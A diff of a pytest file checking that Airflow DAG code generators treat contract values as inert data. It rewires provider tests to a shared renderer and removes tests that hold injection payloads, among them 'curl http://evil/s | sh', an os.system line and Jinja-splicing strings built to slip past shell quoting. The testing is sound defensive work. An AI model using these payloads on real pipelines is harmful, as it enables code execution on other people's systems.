@@ -160,12 +160,17 @@ def test_main_scheduler_exact_poc_defeated():
 
 
 # ---------------------------------------------------------------------------
-# Provider-local generators
+# Every provider's operators, through the one renderer
 # ---------------------------------------------------------------------------
 
 
+def generate_airflow_dag(contract, provider, **config):
+    from fluid_build.schedulers.airflow import render_dag
+
+    return render_dag(contract, provider=provider, provider_config=config)
+
+
 def test_gcp_codegen_is_injection_safe():
-    from fluid_build.providers.gcp.codegen.airflow import generate_airflow_dag
 
     contract = {
         "id": POC_SQUOTE,
@@ -201,11 +206,10 @@ def test_gcp_codegen_is_injection_safe():
             ],
         },
     }
-    assert_inert(generate_airflow_dag(contract, "my-project", "us-central1"))
+    assert_inert(generate_airflow_dag(contract, "gcp", project="my-project", region="us-central1"))
 
 
 def test_snowflake_codegen_is_injection_safe():
-    from fluid_build.providers.snowflake.codegen.airflow import generate_airflow_dag
 
     contract = {
         "id": POC_SQUOTE,
@@ -229,7 +233,11 @@ def test_snowflake_codegen_is_injection_safe():
             ],
         },
     }
-    assert_inert(generate_airflow_dag(contract, account=POC_SQUOTE, database=POC_SQL))
+    assert_inert(
+        generate_airflow_dag(
+            contract, "snowflake", account=POC_SQUOTE, database=POC_SQL, warehouse=POC_SQUOTE
+        )
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -280,415 +288,6 @@ def test_benign_contract_still_produces_expected_operators():
     )  # snowflake provider 6.0 removed SnowflakeOperator
     assert "sql='SELECT 1'" in code
     assert "task_id='load'" in code
-
-
-# ---------------------------------------------------------------------------
-# AirflowDAGGenerator (runtimes/airflow_provider_actions.py)
-#
-# This generator builds a ``BashOperator`` per providerAction. Every task
-# generator previously interpolated contract values straight into
-# ``bash_command="{command}"`` inside an f-string, so a quote in any of them
-# closed the Python literal and put the rest of the value at module scope --
-# executed by Airflow at DAG-parse time. The ``builds[].script`` vector
-# (``scheduleTask``) was the sharpest: it is passed through verbatim by design.
-# ---------------------------------------------------------------------------
-
-
-def _dag_from_actions(provider_actions):
-    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator
-
-    contract = {
-        "id": "test.product.v1",
-        "kind": "DataProduct",
-        "fluidVersion": "0.7.5",
-        "providerActions": provider_actions,
-    }
-    return AirflowDAGGenerator().generate_dag(contract)
-
-
-@pytest.mark.parametrize(
-    "action,params",
-    [
-        ("scheduleTask", {"engine": "dbt", "script": POC_SQUOTE, "buildId": "b1"}),
-        ("scheduleTask", {"engine": "sql", "script": POC_SQL, "buildId": "b1"}),
-        ("scheduleTask", {"engine": "spark", "script": POC_SQUOTE, "buildId": "b1"}),
-        ("scheduleTask", {"engine": "dbt", "script": "", "buildId": POC_SQUOTE}),
-        ("provisionDataset", {"exposeId": POC_SQUOTE}),
-        ("grantAccess", {"principal": POC_SQUOTE, "role": "viewer", "exposeId": "e1"}),
-        ("grantAccess", {"principal": "p", "role": POC_SQL, "exposeId": "e1"}),
-        ("registerSchema", {"schemaName": POC_SQUOTE}),
-        ("createView", {"viewName": POC_SQUOTE}),
-        ("custom", {"customAction": POC_SQUOTE}),
-    ],
-)
-def test_provider_action_dag_is_injection_safe(action, params):
-    """Every params vector must survive only as inert string data."""
-    assert_inert(_dag_from_actions([{"actionId": "a1", "action": action, "params": params}]))
-
-
-def test_provision_task_gcp_location_is_injection_safe():
-    """``binding.location.project``/``dataset`` reach the bq command line."""
-    assert_inert(
-        _dag_from_actions(
-            [
-                {
-                    "actionId": "a1",
-                    "action": "provisionDataset",
-                    "provider": "gcp",
-                    "params": {
-                        "exposeId": "e1",
-                        "binding": {"location": {"project": POC_SQUOTE, "dataset": POC_SQL}},
-                    },
-                }
-            ]
-        )
-    )
-
-
-def test_action_id_and_depends_on_are_sanitised_identifiers():
-    """``actionId`` becomes a Python variable name on both the definition and
-    the ``a >> b`` dependency wiring -- a newline there is a statement."""
-    assert_inert(
-        _dag_from_actions(
-            [
-                {"actionId": POC_IDENT, "action": "registerSchema", "params": {"schemaName": "s"}},
-                {
-                    "actionId": "a2",
-                    "action": "createView",
-                    "params": {"viewName": "v"},
-                    "dependsOn": [POC_IDENT],
-                },
-            ]
-        )
-    )
-
-
-def test_description_comment_cannot_escape_into_code():
-    """``description`` renders into a ``#`` comment, which a newline ends."""
-    assert_inert(
-        _dag_from_actions(
-            [
-                {
-                    "actionId": "a1",
-                    "action": "custom",
-                    "description": "do a thing\nimport os; os.system('touch /tmp/PWNED4')",
-                    "params": {},
-                }
-            ]
-        )
-    )
-
-
-def test_schedule_task_emits_select_not_models():
-    """``--models`` warns on dbt-core 1.10 and is a hard error on dbt v2."""
-    code = _dag_from_actions(
-        [
-            {
-                "actionId": "a1",
-                "action": "scheduleTask",
-                "params": {"engine": "dbt", "script": "my_model", "buildId": "b1"},
-            }
-        ]
-    )
-    assert "--select" in code
-    assert "--models" not in code
-
-
-def test_benign_provider_action_dag_still_renders_operators():
-    """The escaping must not break the happy path."""
-    code = _dag_from_actions(
-        [
-            {
-                "actionId": "build-orders",
-                "action": "scheduleTask",
-                "params": {"engine": "dbt", "script": "orders", "buildId": "b1"},
-            }
-        ]
-    )
-    tree = assert_inert(code)
-    assert "BashOperator" in code
-    assert "build_orders = BashOperator" in code
-    assert isinstance(tree, ast.Module)
-
-
-# ---------------------------------------------------------------------------
-# The DAG *header* is a second surface: dag_id, description, schedule, kind and
-# domain are all contract-derived and land in `DAG(...)` kwargs and a
-# triple-quoted docstring.
-# ---------------------------------------------------------------------------
-
-
-def _dag_from_contract(**contract_overrides):
-    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator
-
-    contract = {
-        "id": "test.product.v1",
-        "kind": "DataProduct",
-        "fluidVersion": "0.7.5",
-        "providerActions": [
-            {"actionId": "a1", "action": "registerSchema", "params": {"schemaName": "s"}}
-        ],
-    }
-    contract.update(contract_overrides)
-    return AirflowDAGGenerator().generate_dag(contract)
-
-
-@pytest.mark.parametrize(
-    "overrides",
-    [
-        {"id": POC_SQUOTE},
-        {"description": POC_SQL},
-        {"description": POC_SQUOTE},
-        {"orchestration": {"schedule": POC_SQUOTE}},
-        {"kind": POC_SQUOTE},
-        {"domain": POC_SQUOTE},
-        {"name": POC_SQL},
-    ],
-)
-def test_dag_header_is_injection_safe(overrides):
-    assert_inert(_dag_from_contract(**overrides))
-
-
-def test_empty_dag_header_is_injection_safe():
-    """The no-actions placeholder DAG renders dag_id/schedule too."""
-    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator
-
-    code = AirflowDAGGenerator().generate_dag(
-        {"id": POC_SQUOTE, "kind": "DataProduct", "fluidVersion": "0.7.5"}
-    )
-    assert_inert(code)
-
-
-def test_schedule_task_script_is_shell_quoted_not_just_python_inert():
-    """`assert_inert` only proves the value cannot escape the *Python* literal.
-
-    The shell layer is separate: the string inside `bash_command` is handed to
-    a shell at task runtime, so a `;` in `script` must not start a new command.
-    """
-    import ast
-
-    code = _dag_from_actions(
-        [
-            {
-                "actionId": "a1",
-                "action": "scheduleTask",
-                "params": {
-                    "engine": "spark",
-                    "script": "job.py; curl http://evil/s | sh",
-                    "buildId": "b1",
-                },
-            }
-        ]
-    )
-    tree = assert_inert(code)
-    commands = [
-        kw.value.value
-        for node in ast.walk(tree)
-        if isinstance(node, ast.Call)
-        for kw in node.keywords
-        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
-    ]
-    assert commands, "no bash_command found"
-    # shlex.quote wraps the whole value, so the `;` is inside quotes.
-    assert commands[0] == "'job.py; curl http://evil/s | sh'", commands[0]
-
-
-# ---------------------------------------------------------------------------
-# The RUNTIME layer. `bash_command` is an Airflow `template_field`, so Airflow
-# re-renders it as Jinja at TASK runtime -- after generation-time quoting is
-# baked in. `shlex.quote` does nothing to `{{ ... }}`, and Jinja string escapes
-# can synthesise a quote from a payload containing none, escaping the quoting.
-# `assert_inert` cannot see this: it only parses the generated Python.
-# ---------------------------------------------------------------------------
-
-#: Renders to a bare `'` without containing one, so shlex.quote has nothing
-#: to escape. This is the payload that defeats quoting-only defences.
-POC_JINJA_QUOTE = '{{ "\\x27" }}; touch /tmp/FLUID_PWNED; #'
-
-#: Same attack, but the delimiters are SPLICED: a single non-overlapping
-#: `re.sub` pass that removes two-character Jinja delimiters rejoins the
-#: survivors into new ones -- `{}}{` -> `{{` and `}{{}` -> `}}` -- so the
-#: payload arrives at the shell with live Jinja. This defeats a
-#: delimiter-matching strip; only stripping braces themselves survives it.
-POC_JINJA_SPLICED = '{}}{ "\\x27" }{{}; touch /tmp/FLUID_PWNED; #'
-
-
-def _bash_commands(code):
-    """Every `bash_command=` value in the generated DAG, as Python sees it."""
-    return [
-        kw.value.value
-        for node in ast.walk(ast.parse(code))
-        if isinstance(node, ast.Call)
-        for kw in node.keywords
-        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
-    ]
-
-
-def _render_like_airflow(command: str) -> str:
-    """Render as Airflow does, with a hostile DAG object in context."""
-    sandbox = pytest.importorskip("jinja2.sandbox")
-
-    class _Dag:
-        description = "'; touch /tmp/FLUID_PWNED_VIA_DAG; #"
-        dag_id = "d"
-
-    class _Var:
-        """Stands in for Airflow's `var.value.<key>` accessor."""
-
-        value = type("V", (), {"__getattr__": lambda self, k: "resolved-" + k})()
-
-    env = sandbox.SandboxedEnvironment()
-    return env.from_string(command).render(dag=_Dag(), var=_Var())
-
-
-@pytest.mark.parametrize(
-    "params",
-    [
-        {"exposeId": POC_JINJA_QUOTE},
-        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_QUOTE, "dataset": "d"}}},
-        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_QUOTE}}},
-        {"exposeId": "{{ dag.description }}"},
-        # Spliced variants -- these pass against a brace strip and FAIL
-        # against a delimiter-matching strip.
-        {"exposeId": POC_JINJA_SPLICED},
-        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_SPLICED, "dataset": "d"}}},
-        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_SPLICED}}},
-    ],
-)
-def test_contract_value_cannot_inject_via_runtime_jinja_render(params):
-    """After Airflow's render, the shell must still see one inert token."""
-    code = _dag_from_actions(
-        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": params}]
-    )
-    for command in _bash_commands(code):
-        rendered = _render_like_airflow(command)
-        # The payload must not have escaped into a second shell command.
-        assert "touch /tmp/FLUID_PWNED" not in shlex.split(rendered), rendered
-        for token in shlex.split(rendered):
-            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"
-
-
-def test_schedule_task_script_cannot_inject_via_runtime_jinja_render():
-    code = _dag_from_actions(
-        [
-            {
-                "actionId": "a1",
-                "action": "scheduleTask",
-                "params": {"engine": "dbt", "script": POC_JINJA_QUOTE, "buildId": "b1"},
-            }
-        ]
-    )
-    for command in _bash_commands(code):
-        rendered = _render_like_airflow(command)
-        assert shlex.split(rendered)[:3] == ["dbt", "run", "--select"], rendered
-        assert len(shlex.split(rendered)) == 4, f"escaped the quoting: {rendered}"
-
-
-def test_generator_authored_jinja_defaults_still_render():
-    """The fix must not break the generator's own `{{ var.value.* }}`."""
-    code = _dag_from_actions(
-        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": {}}]
-    )
-    assert any("var.value.gcp_project" in c for c in _bash_commands(code))
-
-
-@pytest.mark.parametrize("payload", [POC_JINJA_QUOTE, POC_JINJA_SPLICED])
-@pytest.mark.parametrize(
-    "action,params_key",
-    [
-        ("registerSchema", "schemaName"),
-        ("createView", "viewName"),
-        ("grantAccess", "principal"),
-        ("grantAccess", "role"),
-        ("scheduleTask", "buildId"),
-        ("scheduleTask", "script"),
-    ],
-)
-def test_every_bash_command_site_resists_runtime_jinja(action, params_key, payload):
-    """Every command-building branch, both payload shapes.
-
-    `scheduleTask`+`buildId` covers the else-branch that once used bare
-    `shlex.quote` instead of `_sh`; the spliced payload covers the
-    delimiter-rejoin bypass.
-    """
-    params = {"engine": "python", params_key: payload}
-    code = _dag_from_actions([{"actionId": "a1", "action": action, "params": params}])
-    for command in _bash_commands(code):
-        rendered = _render_like_airflow(command)
-        for token in shlex.split(rendered):
-            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"
-
-
-# ---------------------------------------------------------------------------
-# sanitize_identifier is not injective: `a-b` and `a.b` both become `a_b`.
-# codegen_utils documents that as safe because an upstream duplicate-taskId
-# validator rejects duplicate raw ids -- but that validator
-# (validate_contract_for_export) runs only in the Snowflake and GCP providers,
-# never on this path. The result was two assignments to the same variable:
-# the second overwrote the first and one declared task vanished from the DAG.
-# ---------------------------------------------------------------------------
-
-
-def _assigned_task_names(code):
-    return [
-        t.id
-        for node in ast.walk(ast.parse(code))
-        for t in getattr(node, "targets", [])
-        if isinstance(node, ast.Assign) and isinstance(t, ast.Name)
-    ]
-
-
-@pytest.mark.parametrize(
-    "first,second",
-    [
-        ("load-orders", "load.orders"),  # punctuation only
-        ("a b", "a_b"),  # space vs underscore
-        ("x.y.z", "x-y-z"),
-    ],
-)
-def test_colliding_action_ids_still_emit_two_tasks(first, second):
-    code = _dag_from_actions(
-        [
-            {"actionId": first, "action": "registerSchema", "params": {"schemaName": "a"}},
-            {"actionId": second, "action": "createView", "params": {"viewName": "b"}},
-        ]
-    )
-    assert_inert(code)
-    names = [n for n in _assigned_task_names(code) if n not in ("dag", "default_args")]
-    assert len(names) == 2, f"a task was dropped: {names}"
-    assert len(set(names)) == 2, f"two tasks share one variable: {names}"
-
-
-def test_dependency_wiring_follows_the_disambiguated_names():
-    """Each edge must point at its own task, not all at the survivor."""
-    code = _dag_from_actions(
-        [
-            {"actionId": "load-orders", "action": "registerSchema", "params": {"schemaName": "a"}},
-            {"actionId": "load.orders", "action": "createView", "params": {"viewName": "b"}},
-            {
-                "actionId": "final",
-                "action": "registerSchema",
-                "params": {"schemaName": "c"},
-                "dependsOn": ["load-orders", "load.orders"],
-            },
-        ]
-    )
-    assert_inert(code)
-    edges = {line.strip() for line in code.splitlines() if ">>" in line}
-    assert len(edges) == 2, f"edges collapsed onto one task: {edges}"
-
-
-def test_benign_ids_are_unchanged():
-    """Disambiguation must not rename anything that did not collide."""
-    code = _dag_from_actions(
-        [
-            {"actionId": "build-orders", "action": "registerSchema", "params": {"schemaName": "a"}},
-            {"actionId": "grant-analysts", "action": "createView", "params": {"viewName": "b"}},
-        ]
-    )
-    names = set(_assigned_task_names(code))
-    assert {"build_orders", "grant_analysts"} <= names
-    assert not any(n.endswith("_2") for n in names)
 
 
 # ---------------------------------------------------------------------------
@@ -818,31 +417,17 @@ def _aws_contract(**orchestration):
     return {"id": POC_SQUOTE, "name": POC_SQL, "orchestration": base}
 
 
+def _aws_dag(contract):
+    return generate_airflow_dag(contract, "aws", account_id="123456789012", region="eu-west-1")
+
+
 def test_aws_codegen_is_injection_safe():
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag
-
-    assert_inert(generate_airflow_dag(_aws_contract(), "123456789012", "eu-west-1"))
-
-
-def test_aws_taskflow_codegen_is_injection_safe():
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag_taskflow
-
-    assert_inert(generate_airflow_dag_taskflow(_aws_contract(), "123456789012", "eu-west-1"))
+    assert_inert(_aws_dag(_aws_contract()))
 
 
 def test_aws_codegen_emits_no_undefined_names():
     """Classic path: ZoneInfo, the glue/provider helpers, and JSON booleans."""
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag
-
-    assert_no_undefined_names(generate_airflow_dag(_aws_contract(), "123456789012", "eu-west-1"))
-
-
-def test_aws_taskflow_emits_no_undefined_names():
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag_taskflow
-
-    assert_no_undefined_names(
-        generate_airflow_dag_taskflow(_aws_contract(), "123456789012", "eu-west-1")
-    )
+    assert_no_undefined_names(_aws_dag(_aws_contract()))
 
 
 def test_aws_benign_sql_with_apostrophe_still_parses():
@@ -851,8 +436,6 @@ def test_aws_benign_sql_with_apostrophe_still_parses():
     ``WHERE c = 'a'`` closed the hand-written ``query='...'`` and produced a
     DAG that would not parse — no attacker required.
     """
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag
-
     contract = {
         "id": "demo_product",
         "name": "Demo",
@@ -873,7 +456,7 @@ def test_aws_benign_sql_with_apostrophe_still_parses():
             ],
         },
     }
-    code = generate_airflow_dag(contract, "123456789012", "eu-west-1")
+    code = _aws_dag(contract)
     tree = ast.parse(code)
     # the SQL survives intact as inert data, quote and all
     literals = {
@@ -884,9 +467,7 @@ def test_aws_benign_sql_with_apostrophe_still_parses():
 
 def test_aws_round_trips_payload_as_inert_data():
     """Escaping, not stripping: the payload must still be readable as data."""
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag
-
-    code = generate_airflow_dag(_aws_contract(), "123456789012", "eu-west-1")
+    code = _aws_dag(_aws_contract())
     tree = ast.parse(code)
     literals = {
         n.value for n in ast.walk(tree) if isinstance(n, ast.Constant) and isinstance(n.value, str)
@@ -896,8 +477,6 @@ def test_aws_round_trips_payload_as_inert_data():
 
 def test_aws_task_id_collisions_do_not_merge_tasks():
     """``load-orders`` and ``load.orders`` must stay two distinct variables."""
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag
-
     contract = {
         "id": "c",
         "name": "c",
@@ -918,7 +497,7 @@ def test_aws_task_id_collisions_do_not_merge_tasks():
             ]
         },
     }
-    code = generate_airflow_dag(contract, "123456789012", "eu-west-1")
+    code = _aws_dag(contract)
     tree = assert_inert(code)
     # Only module-level assignments: the emitted helper functions legitimately
     # reuse local names such as ``client`` across their separate bodies.
@@ -942,8 +521,6 @@ def test_aws_dep_on_non_dag_task_is_skipped_not_synthesised():
     every task in the file) or, because ``sanitize_identifier`` is not
     injective, silently wired the edge to a *different* real task.
     """
-    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag
-
     contract = {
         "id": "c",
         "name": "c",
@@ -960,19 +537,22 @@ def test_aws_dep_on_non_dag_task_is_skipped_not_synthesised():
             ]
         },
     }
-    code = generate_airflow_dag(contract, "123456789012", "eu-west-1")
+    code = _aws_dag(contract)
     assert_no_undefined_names(code)
     assert "prep >>" not in code
     assert "skipped" in code
 
 
-def test_aws_task_id_cannot_rebind_emitted_module_names():
+def test_task_id_cannot_rebind_emitted_module_names():
     """A taskId of ``dag`` must not overwrite the DAG object itself."""
-    from fluid_build.providers.aws.codegen.airflow import _unique_task_identifiers
+    from fluid_build.providers.common.codegen_utils import unique_task_identifiers
+    from fluid_build.schedulers.airflow._operators import RESERVED_NAMES
 
-    m = _unique_task_identifiers([{"taskId": "dag"}, {"taskId": "_execute_provider_action"}])
-    assert m["dag"] != "dag"
-    assert m["_execute_provider_action"] != "_execute_provider_action"
+    m = unique_task_identifiers(
+        [{"taskId": "dag"}, {"taskId": "_ensure_glue_table"}, {"taskId": "GlueJobOperator"}],
+        reserved=RESERVED_NAMES,
+    )
+    assert all(m[k] != k for k in m)
 
 
 # ---------------------------------------------------------------------------
@@ -983,8 +563,6 @@ def test_aws_task_id_cannot_rebind_emitted_module_names():
 def test_gcp_create_table_schema_is_injection_safe():
     """The schema reaches both create-table operators as a literal: as ``schema_fields``
     and inside ``table_resource``."""
-    from fluid_build.providers.gcp.codegen.airflow import generate_airflow_dag
-
     hostile = [{"name": POC_SQL, "type": POC_SQUOTE, "description": POC_IDENT, POC_SQL: 1}]
     contract = {
         "id": "p",
@@ -1000,7 +578,7 @@ def test_gcp_create_table_schema_is_injection_safe():
             ]
         },
     }
-    code = generate_airflow_dag(contract, "my-project", "us-central1")
+    code = generate_airflow_dag(contract, "gcp", project="my-project", region="us-central1")
     assert_inert(code)
     assert "BigQueryCreateTableOperator(" in code and "BigQueryCreateEmptyTableOperator(" in code
 
